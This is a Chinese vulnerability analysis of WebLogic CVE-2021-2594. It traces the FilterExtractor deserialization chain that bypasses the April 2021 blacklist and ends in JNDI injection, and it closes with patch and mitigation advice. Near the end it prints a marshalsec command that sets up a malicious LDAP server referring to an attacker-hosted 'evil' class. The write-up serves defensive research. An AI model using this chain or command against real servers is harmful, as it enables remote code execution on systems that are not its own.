**作者：kejaly@白帽汇安全研究院  
校对：r4v3zn@白帽汇安全研究院**

## 前言

在2021年7月21日，Oracle官方 发布了一系列安全更新。涉及旗下产品（Weblogic Server、Database Server、Java
SE、MySQL等）的 342 个漏洞，<https://www.oracle.com/security-alerts/cpujul2021.htm
>。其中，Oracle WebLogic Server 产品中有高危漏洞，漏洞编号为 CVE-2021-2594，CVSS 评分9.8分，影响多个
WebLogic 版本，且漏洞利用难度低，可基于 T3 和 IIOP 协议执行远程代码。

![image-20210807174006932](https://images.seebug.org/content/images/2021/08/23/1629704857000-image-20210807174006932.png-w331s)

经过分析，此次漏洞结合了 CVE-2020-14756 和 CVE-2020-14825 反序列化链，利用`FilterExtractor`
这个类来对4月份补丁进行绕过。

## 补丁回顾

在4月份补丁中，对 `ExternalizableHelper` 中的 `readExternalizable` 做了修改，增加了对传入的
`DataInput` 判断，如果是 `ObjectInputStream` 类型就会调用 `checkObjectInputFilter`
函数进行过滤。所以再利用 CVE-2020-14756 中直接反序列化
`com.tangosol.coherence.rest.util.extractor.MvelExtractor` 来造成 RCE 的方法已经行不通了。

![image-20210731200401261](https://images.seebug.org/content/images/2021/08/23/1629704857000-image-20210731200401261.png-w331s)

## 调试环境

**本文基于 win7 虚拟机 + Weblogic 12.1.4 版本 + jdk 8u181 进行研究分析测试**

修改目录 `user_project/domains/base_domain/bin` 目录中 `setDomainEnv.cmd` ，加`if
%debugFlag == "true"%` 之前加入 `set debugFlag=true`。

![image-20210808124527849](https://images.seebug.org/content/images/2021/08/23/1629704857000-image-20210808124527849.png-w331s)

拷贝 `Oracle_Home` 目录下所有文件至调试目录，将 `\coherence\lib`，`\oracle_common\modules`
目录下所有文件添加到 Libraries：

![image-20210808143219244](https://images.seebug.org/content/images/2021/08/23/1629704857000-image-20210808143219244.png-w331s)

配置 idea 中 jdk 版本与虚拟机中运行的 weblogic jdk 版本保持一致。

添加 remote 调试：

![image-20210808130051384](https://images.seebug.org/content/images/2021/08/23/1629704857000-image-20210808130051384.png-w331s)

## 漏洞利用

该漏洞主要是因为 `FilterExtractor` 的 `readExternal` 方法中会直接 `new` 一个
`MethodAttributeAccessor` 对象，使得生成
`MethodAttributeAccessor`的时候不会受到黑名单的限制，来对4月份的补丁进行绕过。

`FilterExtractor` 类具有如下特征：

1.`FilterExtractor` 实现了 `ExternalizableLite` 接口，重写了 `readExternal` 方法：

![image-20210731225455441](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210731225455441.png-w331s)

![image-20210731224853652](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210731224853652.png-w331s)

`readExternal`
会调用`oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor`
方法:

![image-20210731225350786](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210731225350786.png-w331s)

可以看到会 `new` 一个 `MethodAttributeAccessor` 对象，然后根据 `DataInput` 赋值它的
`setAttributeName`，`setGetMethodName` 以及 `setSetMethodName` 属性（这就导致这三个属性是可控的）。

2.`FilterExtractor` 的 `extract` 方法中存在
`this.attributeAccessor.getAttributeValueFromObject()` 的调用。

![image-20210731224758737](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210731224758737.png-w331s)

熟悉 coherence 组件的漏洞的朋友应该知道在 CVE-2020-14825 中，就是利用
`MethodAttributeAccessor.getAttributeValueFromObject()` 来实现任意无参方法的调用的。

![image-20210802114734096](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210802114734096.png-w331s)

虽然 `MethodAttributeAccessor` 已经加入到了黑名单，但是在上面提到的 `readExternal` 方法中恰好直接 `new`
了一个 `MethodAttributeAccessor` 对象，也就是说不是通过反序列化得到 `MethodAttributeAccessor`
对象，自然也就不受黑名单的影响。

### 调用链

完整调用链如下：

![image-20210808155719656](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210808155719656.png-w331s)

![image-20210808155731531](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210808155731531.png-w331s)

### 漏洞分析

根据构造的 poc ，我们首先在 `AttributeHolder` 类的 `readExternal`方法中打上断点，另一边则运行我们的 poc
，成功断下：

![image-20210808140022295](https://images.seebug.org/content/images/2021/08/23/1629704858000-image-20210808140022295.png-w331s)

步入，会调用到 `com.tangosol.util.ExternalizableHelper` 中的 `readObject` 方法：

![image-20210808131237302](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808131237302-16283995577791.png-w331s)

步入，最后会进入到 `com.tangosol.util.ExternalizableHelper`中的 `readObjectInternal`
方法中调用 `readExternalizableLite` 方法：

![image-20210808131451279](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808131451279.png-w331s)

![image-20210808131440537](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808131440537.png-w331s)

步入，在`com.tangosol.util.ExternalizableHelper#readExternalizableLite` 方法中，首先会调用
`loadClass` 去加载类，然后调用无参构造函数实例化一个对象，这里个加载的类是
`com.tangosol.util.aggregator.TopNAggregator$PartialResult`：

![image-20210808140620204](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808140620204.png-w331s)

![image-20210808140805886](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808140805886.png-w331s)

随后会调用 `com.tangosol.util.aggregator.TopNAggregator$PartialResult` 类的
readExternal 方法：

![image-20210808140835192](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808140835192.png-w331s)

步入，会再次调用 `com.tangosol.util.ExternalizableHelper.readObject` 方法来读取一个对象并且赋值到
`this.m_comparator` 中，

![image-20210808141029972](https://images.seebug.org/content/images/2021/08/23/1629704859000-image-20210808141029972.png-w331s)

步入，之后会再次调用到 `com.tangosol.util.ExternalizableHelper#readExternalizableLite`
方法，由于这次读取的 `sClass` 是
`oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor`
，所以会实例化一个 `FilterExtractor` 对象，然后调用它的 `readExternal` 方法：

![image-20210808142024469](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808142024469.png-w331s)

![image-20210808142214228](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808142214228.png-w331s)

步入 ，来到 `FilterExtractor` 的 `readExteral` 中，会调用
`oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor`
方法：

![image-20210808143603175](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808143603175.png-w331s)

步入，会 `new` 一个 `MethodAttributeAccessor` 对象，并且调用
`com.tangosol.util.SerializationHelper#readObject` 方法给
`MethodAttributeAccessor` 对象的 `attributeName` , `getMethodName` 和
`setMethodName` 这三个属性赋值：

![image-20210808143801656](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808143801656.png-w331s)

赋值之后的结果为：

![image-20210808144104145](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808144104145.png-w331s)

再回到之前的 `com.tangosol.util.aggregator.TopNAggregator$PartialResult` 类的
readExternal 方法中，`this.m_comparator` 变成了上面
`oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor`
对象：

![image-20210808144402894](https://images.seebug.org/content/images/2021/08/23/1629704860000-image-20210808144402894.png-w331s)

![image-20210808144327322](https://images.seebug.org/content/images/2021/08/23/1629704861000-image-20210808144327322.png-w331s)

接着在 182 行，会调用 `this.instantiateInternalMap(this.m_comparator)` 方法，步入，会把
`FilterExtractor`再封装到 `WrapperCompator` 中，然后传入 `TreeMap`的构造函数，实例化一个 `TreeMap`
对象并且返回：

![image-20210808141502913](https://images.seebug.org/content/images/2021/08/23/1629704861000-image-20210808141502913.png-w331s)

![image-20210808141550888](https://images.seebug.org/content/images/2021/08/23/1629704861000-image-20210808141550888.png-w331s)

186 行，调用 `this.add` 方法，这里 `ExternalizableHelper.readObject(in)`返回的是
`JdbcRowSetImpl` 对象

![image-20210808144613713](https://images.seebug.org/content/images/2021/08/23/1629704861000-image-20210808144613713.png-w331s)

![image-20210808145429530](https://images.seebug.org/content/images/2021/08/23/1629704861000-image-20210808145429530.png-w331s)

![image-20210808145535391](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808145535391.png-w331s)

接着步入 `super.add` 方法：

![image-20210808145715414](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808145715414.png-w331s)

然后会调用 `TreeMap.put` 方法，添加传入的 `JdbcRowSetImpl` 对象，最后会来到
`com.tangosol.util.WrapperComparator#compare` 方法并触发
`this.f_comparator.compare` 方法， `this.f_comparator` 正是之前传入的 `FilterExtractor`
对象：

![image-20210808145854481](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808145854481.png-w331s)

![image-20210808150025202](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808150025202.png-w331s)

步入，会调用 `com.tangosol.util.extractor#compare` 方法，这个方法中又会调用到 `this.extract`
方法，也就是会调用 `FilterExtractor#extract`方法，进而调用 `this.attributeAccessor` 的
`initializeAttributes` 方法, 而此时的 `this.attributeAccssor` 是
`MethodAttributeAccessor` 对象，所以会调用
`MethodAttributeAccessor#initializeAttributes` 方法：

![image-20210808150355702](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808150355702.png-w331s)

![image-20210808150607874](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808150607874.png-w331s)

在 `MethodAttributeAccessor` 中的 `initializeAttributes` 方法中首先会调用
`this.setGetMethod` 方法来设置 `MethodAttributeAccessor` 的 `getMethod` ：

![image-20210808150900913](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808150900913.png-w331s)

其中 `Helper.getDeclaredMethod` 方法流程如下，是通过传入的类，方法名，以及参数类型来得到对应 `class` 的
`Method`：

![image-20210808151640146](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808151640146.png-w331s)

![image-20210808151652788](https://images.seebug.org/content/images/2021/08/23/1629704862000-image-20210808151652788.png-w331s)

![image-20210808151710584](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808151710584.png-w331s)

此时由于 `theJavaClass` 是 `com.sun.rowset.JdbcRowSetImpl`, `this.getMethodName` 是
`"prepare"` ，所以第一次得到的 `prepare` 方法：

![image-20210808152025322](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808152025322.png-w331s)

![image-20210808151846383](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808151846383.png-w331s)

![image-20210808152752546](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808152752546.png-w331s)

与 CVE-2020-14825 的反序列化流程不同的是， 因为在 `initializeAttributes` 的时候，我们不能再通过控制
`isWriteOnly` 属性为 `true` ，所以会进入到下面这个 if 分支里面去：

![image-20210808152621203](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808152621203.png-w331s)

会先调用 `this.getSetMethodParameterTypes` 得到 `this.getGetMethod` 属性代表的方法的返回值：

![image-20210808152901259](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808152901259.png-w331s)

![image-20210808152930826](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808152930826.png-w331s)

`this.getGetMethod` 在上一步赋值为了 `protected java.sql.PreparedStatement
com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException` ，

![image-20210808152752546](https://images.seebug.org/content/images/2021/08/23/1629704863000-image-20210808152752546.png-w331s)

所以这里 `this.getSetMethodParameterTypes` 方法得到的是 `java.sql.PreparedStatement`类型:

![image-20210808153417492](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808153417492.png-w331s)

然后调用`Helper.getDeclaredMethod(theJavaClass, this.getSetMethodName(),
this.getSetMethodParameterTypes());` 就会得到 `protected
java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws
java.sql.SQLException` 方法。

`initializeAttributes` 结束后 `MethodAttributeAccessor`的属性值：

![image-20210808151526352](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808151526352.png-w331s)

接着，回到 `FilterExtractor#extract` 方法中，会继续调用
`this.attributeAccessor.getAttributeValueFromObject` 也就是调用
`MethodAttributeAccessor.getAttributeValueFromObject` 方法：

![image-20210808154424927](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808154424927.png-w331s)

步入：

![image-20210808154531032](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808154531032.png-w331s)

步入，会利用反射调用方法：

![image-20210808154635155](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808154635155.png-w331s)

此时 `this.getMethod` 是 `protected java.sql.PreparedStatement
com.sun.rowset.JdbcRowSetImpl.prepare() throws
java.sql.SQLException`，`abObject` 是 `JbbcRoeSetImpl` ：

![image-20210808154732164](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808154732164.png-w331s)

这就导致了 jndi 注入的产生：

![image-20210808155204288](https://images.seebug.org/content/images/2021/08/23/1629704864000-image-20210808155204288.png-w331s)

![image-20210808155230255](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210808155230255.png-w331s)

![image-20210808155304593](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210808155304593.png-w331s)

我们在本地使用 marshalsec 搭建恶意 jndi 服务端：

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.1:8000/#evil 1389
    python -m http.server

成功 RCE：

![image-20210808155635821](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210808155635821.png-w331s)

### jndi 版本问题

在Oracle JDK 11.0.1、8u191、7u201、6u211之后
com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被设置为false，所以此 ldap + jndi 导致
RCE 的方法失效。

### 10.3.6.0
问题![image-20210731232046827](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210731232046827.png-w331s)

在使用基于 `TopNAggregator.PartialResult` 的 poc 对官网说的版本进行复现的时候，发现 10.3.6.0.0
版本中并不存在 `com.tangosol.util.SortedBag` 和
`com.tangosol.util.aggregator.TopNAggregator` 这两个类：

![image-20210731210430975](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210731210430975.png-w331s)

缺少 `SortedBag`：

![image-20210731210551756](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210731210551756.png-w331s)

缺少 `TopNAggregator` ：

![image-20210731210604714](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210731210604714.png-w331s)

### weblogic 版本问题

使用不同 weblogic 版本的 jar 包对不同版本的 weblogic 进行测试，经过测试研究发现以下情况：

jar 版本 | weblogic 版本 | 成功情况  
---|---|---  
12.1.3.0.0 | 12.1.3.0.0 | 成功  
12.1.3.0.0 | 12.2.1.3.0 | 失败  
12.1.3.0.0 | 12.2.1.4.0 | 失败  
12.1.3.0.0 | 14.1.1.0.0 | 失败  
12.2.1.3.0 | 12.1.3.0.0 | 失败  
12.2.1.3.0 | 12.2.1.3.0 | 成功  
12.2.1.3.0 | 12.2.1.4.0 | 成功  
12.2.1.3.0 | 14.1.1.0.0 | 成功  
12.2.1.4.0 | 12.1.3.0.0 | 失败  
12.2.1.4.0 | 12.2.1.3.0 | 成功  
12.2.1.4.0 | 12.2.1.4.0 | 成功  
12.2.1.4.0 | 14.1.1.0.0 | 成功  
14.1.1.0.0 | 12.1.3.0.0 | 失败  
14.1.1.0.0 | 12.2.1.3.0 | 成功  
14.1.1.0.0 | 12.2.1.4.0 | 成功  
14.1.1.0.0 | 14.1.1.0.0 | 成功  
  
## 7月份补丁影响

打了7月份补丁之后，会报错：

![image-20210810163347804](https://images.seebug.org/content/images/2021/08/23/1629704865000-image-20210810163347804.png-w331s)

原因是在 `WebLogicFilterConfig` 类的`DEFAULT_BLACKLIST_PACKAGES` 字段中新增了
`oracle.eclipselink.coherence.integrated.internal.querying` 这个包：

![image-20210810184055290](https://images.seebug.org/content/images/2021/08/23/1629704866000-image-20210810184055290.png-w331s)

而 `FilterExtractor` 类正好在
`oracle.eclipselink.coherence.integrated.internal.querying` 包下面，所以导致被黑名单拦截了下来。

## 修复建议

### 通用修补建议

Oracle官方已经发布补丁，及时进行更新：<https://www.oracle.com/security-alerts/cpujul2021.html>

### Weblogic 临时修补建议

  1. 如果不依赖 T3协议进行 JVM通信，可禁用 T3协议。
  2. 如果不依赖 IIOP协议进行 JVM通信，可禁用 IIOP协议。

## 参考

<https://www.cnblogs.com/potatsoSec/p/15062094.html>

<https://mp.weixin.qq.com/s/LbMB-2Qyrh3Lrqc_vsKIdA>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1684/>

